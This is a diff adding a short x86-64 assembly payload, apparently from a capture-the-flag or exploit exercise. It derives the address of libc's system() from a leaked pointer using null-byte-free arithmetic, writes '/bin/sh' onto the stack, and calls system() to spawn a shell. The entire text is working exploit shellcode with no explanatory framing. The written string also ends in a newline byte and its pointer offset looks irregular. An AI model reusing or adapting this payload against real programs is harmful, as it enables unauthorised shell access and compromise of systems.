@@ -1,0 +1,23 @@
+# Leak system
+mov rdx, rcx
+mov rbx, 17632578
+sub rdx, rbx
+add rdx, 0x01010101
+
+# Write "/bin/sh"
+mov rbx, rsp
+add rbx, 0x01010211
+sub rbx, 0x01010101
+mov dword ptr [rbx], 0x6e69622f
+add rbx, 0x4
+mov dword ptr [rbx], 0x0a68732f
+sub rbx, 0x3
+
+# Call system("/bin/sh")
+mov rdi, rbx
+call rdx
+
+
+
+
+
